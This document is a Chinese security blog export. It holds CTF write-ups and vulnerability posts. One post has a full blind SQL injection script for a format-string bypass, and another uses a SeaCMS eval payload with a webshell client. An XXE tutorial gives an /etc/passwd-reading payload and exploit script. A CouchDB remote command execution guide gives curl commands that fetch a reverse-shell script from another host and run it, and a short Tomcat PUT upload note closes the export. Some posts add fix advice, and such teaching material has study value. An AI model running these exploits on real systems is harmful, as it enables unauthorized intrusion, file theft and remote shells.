<p><img src="/images/%E9%83%A8%E5%88%86CTF_1/7.png" alt="7"></p>
<p>首先尝试弱口令可以判断出用户名为admin</p>
<p><img src="/images/%E9%83%A8%E5%88%86CTF_1/5.png" alt="5"></p>
<p>这个时候可以使用Intruder爆破过滤掉的字符，发现当username=admin%时有报错</p>
<p><img src="/images/%E9%83%A8%E5%88%86CTF_1/6.png" alt="6"></p>
<p>sprintf函数出错即为<strong>sqli格式化字符串逃逸漏洞</strong>，构造</p>
<p><code>username=admin%1$\&#39; and 1=2# 与 username=admin%1$\&#39; and 1=1#</code></p>
<p>可见or之后的语句执行正确则回显“password error！”，若错误则回显“username error！”所以是基于布尔的盲注</p>
<p>可以使用Sqlmap或者脚本跑出flag</p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boom</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">r'http://588910e1c470463b8f17d83618c14f434a213ad768224411.changame.ichunqiu.com/'</span></span><br><span class="line">    s = requests.session()</span><br><span class="line"><span class="comment">#会话对象requests.Session能够跨请求地保持某些参数，比如cookies，即在同一个Session实例发出的所有请求都保持同一个cookies,而requests模块每次会自动处理cookies，这样就很方便地处理登录时的cookies问题。</span></span><br><span class="line">    dic = string.digits + string.letters + <span class="string">"!@#$%^&amp;*()_+&#123;&#125;-="</span></span><br><span class="line">    right = <span class="string">'password error!'</span></span><br><span class="line">    error = <span class="string">'username error!'</span></span><br><span class="line">    lens = <span class="number">0</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line"><span class="comment">#	//确定当前数据库的长度</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">"admin%1$\\' or "</span> + <span class="string">"length(database())&gt;"</span> + str(i) + <span class="string">"#"</span></span><br><span class="line">        data=&#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="number">1</span>&#125;</span><br><span class="line">        r = s.post(url,data=data).content</span><br><span class="line">        <span class="keyword">if</span> error <span class="keyword">in</span> r:</span><br><span class="line">            lens=i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"[+]length(database()): %d"</span> %(lens))</span><br><span class="line"><span class="comment">#	//确定当前数据库的名字</span></span><br><span class="line">    strs=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(lens+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            payload = <span class="string">"admin%1$\\' or "</span> + <span class="string">"ascii(substr(database(),"</span> + str(i) +<span class="string">",1))="</span> + str(ord(c)) + <span class="string">"#"</span></span><br><span class="line">            data = &#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="number">1</span>&#125;</span><br><span class="line">            r = s.post(url,data=data).content</span><br><span class="line">            <span class="keyword">if</span> right <span class="keyword">in</span> r:</span><br><span class="line">                strs = strs + c</span><br><span class="line">                <span class="keyword">print</span> strs</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"[+]database():%s"</span> %(strs))</span><br><span class="line"> </span><br><span class="line">    lens=<span class="number">0</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">"admin%1$\\' or "</span> + <span class="string">"(select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;"</span> + str(i) + <span class="string">"#"</span></span><br><span class="line"><span class="comment">#		//对当前的数据库，查询第一个表的长度</span></span><br><span class="line">        data = &#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="number">1</span>&#125;</span><br><span class="line">        r = s.post(url,data=data).content</span><br><span class="line">        <span class="keyword">if</span> error <span class="keyword">in</span> r:</span><br><span class="line">            lens = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"[+]length(table): %d"</span> %(lens))</span><br><span class="line"> </span><br><span class="line">    strs=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(lens+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            payload = <span class="string">"admin%1$\\' or "</span> + <span class="string">"ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),"</span> + str(i) +<span class="string">",1))="</span> + str(ord(c)) + <span class="string">"#"</span></span><br><span class="line"><span class="comment">#			// 数字一定要str才可以传入</span></span><br><span class="line">            data = &#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="number">1</span>&#125;</span><br><span class="line">            r = s.post(url,data=data).content</span><br><span class="line">            <span class="keyword">if</span> right <span class="keyword">in</span> r:</span><br><span class="line">                strs = strs + c</span><br><span class="line">                <span class="keyword">print</span> strs</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"[+]table_name:%s"</span> %(strs))</span><br><span class="line">    tablename = <span class="string">'0x'</span> + strs.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="comment">#	//编码为16进制</span></span><br><span class="line">    table_name = strs</span><br><span class="line"> </span><br><span class="line">    lens=<span class="number">0</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">"admin%1$\\' or "</span> + <span class="string">"(select length(column_name) from information_schema.columns where table_name = "</span> + str(tablename) + <span class="string">" limit 0,1)&gt;"</span> + str(i) + <span class="string">"#"</span></span><br><span class="line">        data = &#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="number">1</span>&#125;</span><br><span class="line">        r = s.post(url,data=data).content</span><br><span class="line">        <span class="keyword">if</span> error <span class="keyword">in</span> r:</span><br><span class="line">            lens = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"[+]length(column): %d"</span> %(lens))</span><br><span class="line"> </span><br><span class="line">    strs=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(lens+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            payload = <span class="string">"admin%1$\\' or "</span> + <span class="string">"ascii(substr((select column_name from information_schema.columns where table_name = "</span> + str(tablename) +<span class="string">" limit 0,1),"</span> + str(i) + <span class="string">",1))="</span> + str(ord(c)) + <span class="string">"#"</span></span><br><span class="line">            data = &#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="number">1</span>&#125;</span><br><span class="line">            r = s.post(url,data=data).content</span><br><span class="line">            <span class="keyword">if</span> right <span class="keyword">in</span> r:</span><br><span class="line">                strs = strs + c</span><br><span class="line">                <span class="keyword">print</span> strs</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"[+]column_name:%s"</span> %(strs))</span><br><span class="line">    column_name = strs</span><br><span class="line">	</span><br><span class="line">    num=<span class="number">0</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">"admin%1$\\' or "</span> + <span class="string">"(select count(*) from "</span> + table_name + <span class="string">")&gt;"</span> + str(i) + <span class="string">"#"</span></span><br><span class="line">        data = &#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="number">1</span>&#125;</span><br><span class="line">        r = s.post(url,data=data).content</span><br><span class="line">        <span class="keyword">if</span> error <span class="keyword">in</span> r:</span><br><span class="line">            num = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"[+]number(column): %d"</span> %(num))</span><br><span class="line"> </span><br><span class="line">    lens=<span class="number">0</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">"admin%1$\\' or "</span> + <span class="string">"(select length("</span> + column_name + <span class="string">") from "</span> + table_name + <span class="string">" limit 0,1)&gt;"</span> + str(i) + <span class="string">"#"</span></span><br><span class="line">        data = &#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="number">1</span>&#125;</span><br><span class="line">        r = s.post(url,data=data).content</span><br><span class="line">        <span class="keyword">if</span> error <span class="keyword">in</span> r:</span><br><span class="line">            lens = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"[+]length(value): %d"</span> %(lens))</span><br><span class="line"> </span><br><span class="line">    i=<span class="number">1</span>    </span><br><span class="line">    strs=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(lens+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            payload = <span class="string">"admin%1$\\' or ascii(substr((select flag from flag limit 0,1),"</span> + str(i) + <span class="string">",1))="</span> + str(ord(c)) + <span class="string">"#"</span></span><br><span class="line">            data = &#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="string">'1'</span>&#125;</span><br><span class="line">            r = s.post(url,data=data).content</span><br><span class="line">            <span class="keyword">if</span> right <span class="keyword">in</span> r:</span><br><span class="line">                strs = strs + c</span><br><span class="line">                <span class="keyword">print</span> strs</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"[+]flag:%s"</span> %(strs))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    boom()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Finish!'</span></span><br></pre></td></tr></table></figure>





<h4 id="key又找不到了"><a href="#key又找不到了" class="headerlink" title="key又找不到了"></a>key又找不到了</h4><p>拿到题目查看网页源码发现提示</p>
<p><img src="/images/%E9%83%A8%E5%88%86CTF_1/8.png" alt="8"></p>
<p>访问/search_key.php时跳转到另一个网页，说明有重定向，于是用burp抓包，在get时传递参数</p>
<p><font color="red"><strong>allow_redirects=False</strong></font></p>
<p>得到</p>
<p><img src="/images/%E9%83%A8%E5%88%86CTF_1/9.png" alt="9"></p>
<p>再次传递参数访问/key_is_here_now.php</p>
<p><img src="/images/%E9%83%A8%E5%88%86CTF_1/10.png" alt="10"></p>
<h4 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h4><p>这道题目给的提示是：<strong>善于查资料，你就可以拿一血了</strong>，所以很有可能是某cms的历史漏洞，去百度查询海洋CMS</p>
<p><a href="http://0day5.com/archives/4180/" target="_blank" rel="noopener">海洋CMS V6.28代码执行0day</a></p>
<p>按照给出的payload，直接访问<strong>url+/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1])</strong></p>
<p>然后用菜刀连接</p>
<p><img src="/images/%E9%83%A8%E5%88%86CTF_1/11.png" alt="11"></p>
<p>但是发现没有flag，但却能查到海洋cms的数据库配置文件，使用菜刀连接数据库</p>
<p><img src="/images/%E9%83%A8%E5%88%86CTF_1/12.png" alt="12"></p>
<p>然后右键数据库管理看到flag</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>XML外部实体注入漏洞</title>
    <url>/2019/01/14/XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="XML外部实体注入漏洞"><a href="#XML外部实体注入漏洞" class="headerlink" title="XML外部实体注入漏洞"></a>XML外部实体注入漏洞</h1><h4 id="漏洞介绍："><a href="#漏洞介绍：" class="headerlink" title="漏洞介绍："></a>漏洞介绍：</h4><p>​    XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击。漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。</p>
<p>由于站点的建站语言不同，PHP、JAVA、python等也有不同的解析规则，在实际情况中不能一概而论，但原理是相同的。</p>
<a id="more"></a>

<h4 id="XML介绍："><a href="#XML介绍：" class="headerlink" title="XML介绍："></a>XML介绍：</h4><p>​    XML是用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。</p>
<p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
<p>XML中对数据的引用称为实体，实体中有一类叫外部实体，用来引入外部资源，有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以借助各种协议，比如如下的三种：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file.ext</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url</span><br><span class="line"></span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;conf.php</span><br></pre></td></tr></table></figure>

<p><strong>XML在调用外部实体整体的写法如下：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xdsec</span> [</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">methodname</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span>(实体引用名) <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>(实体内容) &gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">methodcall</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">methodname</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">methodname</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">methodcall</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="漏洞验证："><a href="#漏洞验证：" class="headerlink" title="漏洞验证："></a>漏洞验证：</h4><p>​    <code>simplexml_load_string.php</code>代码如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">$data = file_get_contents(<span class="string">'php://input'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php">$xml = simplexml_load_string($data);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $xml-&gt;name;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>最开始，引入一个<code>file_get_contents</code>函数，将整个XML数据读入<code>data</code>字符串中，然后交给php的xml解析函数<code>simplexml_load_string()</code>解析，解析后的数据赋给<code>xml</code>变量。这一数据即XML字符串中使用的对象(或者说根元素)的数据，并echo输出出来。</p>
<p>使用burp拦截数据包，在repeater中直接将如下XML文本写在数据保包内容的后面</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span> &gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这一步骤将XML内容发送给服务器，当服务器将XML解析完成后，就会依照解析的内容工作，这段XML中<code>SYSTEM &quot;file:///etc/passwd&quot;</code>部分引用了目标服务器下的<code>/etc/passwd</code>文件，服务器解析XML内容后，会将这一文件内容存入<code>&amp;xxe</code>中，然后将数据返回给恶意访问者。</p>
<p>执行完成上面的操作后，点击GO，右侧将出现此数据包的返回结果，内容如下，返回的数据为服务器上<code>/etc/passwd</code>文件的内容</p>
<p><img src="/images/XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1.png" alt="1"></p>
<p>访问一下index.php，可以看到确实是执行了phpinfo();函数</p>
<p><strong>利用恶意脚本：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">u'输入要读取的文件，如file:///etc/passwd'</span></span><br><span class="line"></span><br><span class="line">    payload = raw_input()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">u'输入要访问的地址，如http://172.xx.xx.xx/simplexml_load_string.php'</span></span><br><span class="line"></span><br><span class="line">    url = raw_input()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#url = 'http://192.168.1.1/simplexml_load_string.php'</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;<span class="string">'Content-type'</span>: <span class="string">'text/xml'</span>&#125;</span><br><span class="line"></span><br><span class="line">    xml = <span class="string">'&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM "'</span> + payload + <span class="string">'" &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;'</span></span><br><span class="line"></span><br><span class="line">    req = urllib2.Request(url = url,headers = headers, data = xml)</span><br><span class="line"></span><br><span class="line">    res_data = urllib2.urlopen(req)</span><br><span class="line"></span><br><span class="line">    res = res_data.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> res</span><br></pre></td></tr></table></figure>

<p>通过<code>urllib2</code>的request方法用POST方式向目标地址发送XML数据，返回的数据即为服务器下的<code>/etc/passwd</code>文件</p>
<h4 id="XML可以造成的为危害有："><a href="#XML可以造成的为危害有：" class="headerlink" title="XML可以造成的为危害有："></a>XML可以造成的为危害有：</h4><p>​    任意文件读取</p>
<p>​    系统命令执行    </p>
<p>​    内网主机及服务探测</p>
<p>系统命令执行需要在安装了EXPECET扩展的PHP环境下才能执行，内网主机及服务探测可以通过HTTP协议来执行</p>
<h4 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h4><ul>
<li>使用libxml2.8.0以上版本xml解析库，默认禁止外部实体的解析</li>
<li>对于PHP,由于simplexml_load_string函数的XML解析问题出在libxml库上,所以加载实体前可以调用函数进行过滤</li>
<li>可将外部实体、参数实体和内联DTD都被设置为false，从而避免基于XXE漏洞的攻击。</li>
</ul>
]]></content>
      <tags>
        <tag>XML</tag>
      </tags>
  </entry>
  <entry>
    <title>Remote Command Execution via CouchDB</title>
    <url>/2018/12/26/Coutchdb/</url>
    <content><![CDATA[<h3 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h3><p>​          CouchDB是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation (JSON) API 访问。CouchDB可以安装在大部分POSIX系统上，包括Linux和Mac OS X。</p>
<h4 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h4><p>​          Couchdb默认会在5984端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。</p>
 <a id="more"></a>

<p>​          执行命令是需要获取到admin权限，如果数据库存在未授权则可以直接利用，若存在管理账号则需要获取到admin的密码（可以使用Burp爆破。然后利用admin的Cookie进行操作。 </p>
<h4 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>​             Couchdb在5984端口开放接口。在浏览器中运行<code>&quot;http://127.0.0.1/utils&quot;</code>可进入到管理页面。用Burp抓包爆破管理账号密码，获取Cookie后再利用远程命令执行</p>
<ul>
<li><p>远程命令执行实例：</p>
</li>
<li><ol>
<li>新增query_server配置，写入要执行的命令；</li>
<li>新建一个临时库和临时表，插入一条记录；</li>
<li>调用query_server处理数据</li>
</ol>
</li>
</ul>
<p><strong>命令代码：</strong></p>
<p>​       一、远程下载反弹脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT &#39;&lt;http:&#x2F;&#x2F;192.168.199.181:5984&#x2F;_config&#x2F;query_servers&#x2F;cmd&gt;&#39; -d &#39;&quot;curl &lt;http:&#x2F;&#x2F;192.168.199.140:88&#x2F;back.py&gt; -o &#x2F;tmp&#x2F;back.py&quot;&#39;   -H &quot;Cookie: AuthSession&#x3D;YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT &#39;&lt;http:&#x2F;&#x2F;192.168.199.181:5984&#x2F;teeest&#x2F;vul&gt;&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;  -H &quot;Cookie: AuthSession&#x3D;YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><figcaption><span>-X POST '<http: 192.168.199.181:5984 teeest _temp_view?limit< span></http:></span></figcaption><table><tr><td class="code"><pre><span class="line">curl -X POST &#39;&lt;http:&#x2F;&#x2F;192.168.199.181:5984&#x2F;teeest&#x2F;_temp_view?limit&#x3D;11&gt;&#39; -d &#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type: application&#x2F;json&#39;  -H &quot;Cookie: AuthSession&#x3D;YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4&quot;</span><br></pre></td></tr></table></figure>



<p><strong>添加执行权限：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT &#39;&lt;http:&#x2F;&#x2F;192.168.199.181:5984&#x2F;_config&#x2F;query_servers&#x2F;cmd&gt;&#39; -d &#39;&quot;chmod 777 &#x2F;tmp&#x2F;back.py&quot;&#39;   -H &quot;Cookie: AuthSession&#x3D;YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT &#39;&lt;http:&#x2F;&#x2F;192.168.199.181:5984&#x2F;teeest&gt;&#39;  -H &quot;Cookie: AuthSession&#x3D;YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT &#39;&lt;http:&#x2F;&#x2F;192.168.199.181:5984&#x2F;teeest&#x2F;vul&gt;&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;  -H &quot;Cookie: AuthSession&#x3D;YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X POST &#39;&lt;http:&#x2F;&#x2F;192.168.199.181:5984&#x2F;teeest&#x2F;_temp_view?limit&#x3D;11&gt;&#39; -d &#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type: application&#x2F;json&#39;  -H &quot;Cookie: AuthSession&#x3D;YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4&quot;</span><br></pre></td></tr></table></figure>



<p><strong>执行反弹脚本：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT &#39;&lt;http:&#x2F;&#x2F;192.168.199.181:5984&#x2F;_config&#x2F;query_servers&#x2F;cmd&gt;&#39; -d &#39;&quot;python &#x2F;tmp&#x2F;back.py&quot;&#39;   -H &quot;Cookie: AuthSession&#x3D;YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT &#39;&lt;http:&#x2F;&#x2F;192.168.199.181:5984&#x2F;teeest&gt;&#39;  -H &quot;Cookie: AuthSession&#x3D;YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT &#39;&lt;http:&#x2F;&#x2F;192.168.199.181:5984&#x2F;teeest&#x2F;vul&gt;&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;  -H &quot;Cookie: AuthSession&#x3D;YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X POST &#39;&lt;http:&#x2F;&#x2F;192.168.199.181:5984&#x2F;teeest&#x2F;_temp_view?limit&#x3D;11&gt;&#39; -d &#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type: application&#x2F;json&#39;  -H &quot;Cookie: AuthSession&#x3D;YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4&quot;</span><br></pre></td></tr></table></figure>



<p><strong>Getshell</strong></p>
<p><strong>使用curl下载反弹脚本时可使用python监听</strong></p>
<p><strong>nc监听是否反弹</strong></p>
<p><strong>5974端口          ssrf+gopher</strong></p>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2017-12615(Tomcat 远程代码执行漏洞)</title>
    <url>/2018/12/20/CVE-2017-12615/</url>
    <content><![CDATA[<p><strong>Tomcat远程代码执行漏洞（CVE-2018-12615)</strong></p>
<p>​    <strong>Tomcat：</strong>Tomcat服务器是一个免费的开放源代码的Web应用服务器。    </p>
<p>​        <strong>漏洞介绍：</strong>Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT请求方法，恶意访问者通过构造的请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行，危害十分严重。</p>
<p>​        <strong>影响范围：</strong>Apache Tomcat 7.0.0-7.0.81（Apache Tomcat 8.X  Apache Tomcat 9.X 不受影响）</p>
<p>​    <strong>漏洞分析：</strong>在Tomcat安装目录下的配置文件web.xml中的<strong><u>org.apache.catalina.servlets.DefaultServlet</u></strong> 方法下如果该方法有如下代码，即表示Tomcat已开启PUT方法</p>
<a id="more"></a>
<p><img src="/images/CVE-2017-12615/1.png" alt="1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;init-param&gt; </span><br><span class="line">      &lt;param-name&gt;readonly&lt;&#x2F;param-name&gt; </span><br><span class="line">      &lt;param-value&gt;false&lt;&#x2F;param-value&gt; </span><br><span class="line">&lt;&#x2F;init-param&gt;</span><br></pre></td></tr></table></figure>

<p>然后可以通过PUT方法上传一句话</p>
<p><strong>修复方案：</strong></p>
<p>​    用户可以禁用PUT方法来防护该漏洞</p>
